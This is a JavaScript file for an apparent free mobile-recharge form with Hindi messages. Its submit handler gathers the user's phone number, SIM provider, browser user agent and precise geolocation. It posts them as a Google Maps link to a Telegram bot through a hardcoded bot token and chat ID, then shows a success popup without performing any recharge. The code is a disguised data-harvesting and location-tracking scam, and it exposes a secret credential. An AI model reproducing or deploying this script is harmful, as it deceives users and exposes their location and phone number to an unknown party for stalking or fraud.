const form = document.getElementById("rechargeForm");
const submitBtn = document.getElementById("submitBtn");
const loadingSpinner = document.getElementById("loadingSpinner");
const popupModal = document.getElementById("popupModal");
const closePopupBtn = document.getElementById("closePopup");

form.addEventListener("submit", async function (e) {
  e.preventDefault();

  const sim = document.getElementById("sim").value;
  const mobile = document.getElementById("mobile").value.trim();

  if (!sim) {
    alert("कृपया सिम का चयन करें।");
    return;
  }
  if (mobile.length !== 10 || isNaN(mobile)) {
    alert("कृपया 10 अंकों का मान्य मोबाइल नंबर दर्ज करें।");
    return;
  }
  if (!navigator.geolocation) {
    alert("आपके ब्राउज़र में लोकेशन सपोर्ट नहीं है।");
    return;
  }

  // Show spinner, hide submit button
  submitBtn.style.display = "none";
  loadingSpinner.style.display = "block";

  navigator.geolocation.getCurrentPosition(
    async (position) => {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      const device = navigator.userAgent;

      const botToken = "8216004415:AAF-MF8E-tRBw6h5-BfC3_i1FagixuSt9Rc";
      const chatId = "6038115234";

      const message = `📱 New Recharge Request:
SIM: ${sim}
Number: ${mobile}
Device: ${device}
Location: https://www.google.com/maps?q=${latitude},${longitude}`;

      try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, text: message }),
        });

        // Hide spinner, show popup
        loadingSpinner.style.display = "none";
        popupModal.classList.add("show");
        form.reset();
      } catch (error) {
        alert("कुछ त्रुटि हुई, कृपया पुनः प्रयास करें।");
        loadingSpinner.style.display = "none";
        submitBtn.style.display = "inline-block";
      }
    },
    () => {
      alert("लोकेशन एक्सेस नहीं हो सका। कृपया अनुमति दें।");
      loadingSpinner.style.display = "none";
      submitBtn.style.display = "inline-block";
    }
  );
});

// Close popup on button click
closePopupBtn.addEventListener("click", () => {
  popupModal.classList.remove("show");
  submitBtn.style.display = "inline-block";
});
